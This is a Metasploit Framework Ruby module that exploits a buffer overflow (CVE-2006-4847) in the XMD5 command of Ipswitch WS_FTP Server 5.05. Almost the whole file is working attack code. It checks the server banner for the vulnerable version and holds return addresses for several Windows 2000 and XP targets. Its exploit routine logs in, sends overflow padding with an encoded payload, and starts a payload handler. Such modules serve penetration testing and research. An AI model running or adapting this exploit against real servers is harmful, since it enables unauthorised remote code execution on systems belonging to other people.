##
# $Id: wsftp_server_505_xmd5.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Ipswitch WS_FTP Server 5.05 XMD5 Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in the XMD5 verb in
				IPSWITCH WS_FTP Server 5.05.
			},
			'Author'         => 'MC',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2006-4847' ],
					[ 'OSVDB', '28939' ],
					[ 'BID', '20076' ],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 300,
					'BadChars' => "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 Pro SP4 English', { 'Ret' => 0x7c2ec663 } ],
					[ 'Windows XP Pro SP0 English',   { 'Ret' => 0x77dc0df0 } ],
					[ 'Windows XP Pro SP1 English',   { 'Ret' => 0x77dc5527 } ],

				],
			'DisclosureDate' => 'Sep 14 2006',
			'DefaultTarget' => 0))
	end

	def check
		connect
		disconnect
		if (banner =~ /WS_FTP Server 5.0.5/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect_login

		print_status("Trying target #{target.name}...")

		sploit =  rand_text_alphanumeric(676, payload_badchars)
		sploit << [target.ret].pack('V') + payload.encoded

		send_cmd( ['XMD5', sploit] , false)

		handler
		disconnect
	end

end
